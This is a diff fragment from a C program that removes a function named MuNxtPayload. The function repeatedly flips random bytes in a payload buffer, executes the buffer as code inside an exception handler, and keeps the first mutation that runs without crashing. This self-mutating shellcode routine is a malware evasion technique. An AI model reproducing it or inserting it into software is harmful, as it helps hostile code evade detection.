@@ -84,27 +84,3 @@ int main(int argc, char** argv)
         Killer();
     }
 }
-
-void MuNxtPayload()
-{
-    int MuPos = 0;
-    UINT8 bakupData = 0;
-    while(1)
-    {
-        printf("Finding Liveable Mutation Position...\n");
-        MuPos = rand() % (NextPayloadSize - 5) + 4; // Keep first 4 bytes and last 1 byte
-        bakupData = nextPayloadBuf[MuPos];
-        nextPayloadBuf[MuPos] = rand() % 256;
-        __try
-        {
-            ((void(*)())(nextPayloadBuf + 1))();
-            printf("Mutation Success @ 0x%X\n", MuPos);
-            break;
-        }
-        __except (EXCEPTION_EXECUTE_HANDLER)
-        {
-            printf("Mutation Failed @ 0x%X, revert data\n", MuPos);
-            nextPayloadBuf[MuPos] = bakupData;
-        }
-    }
-}
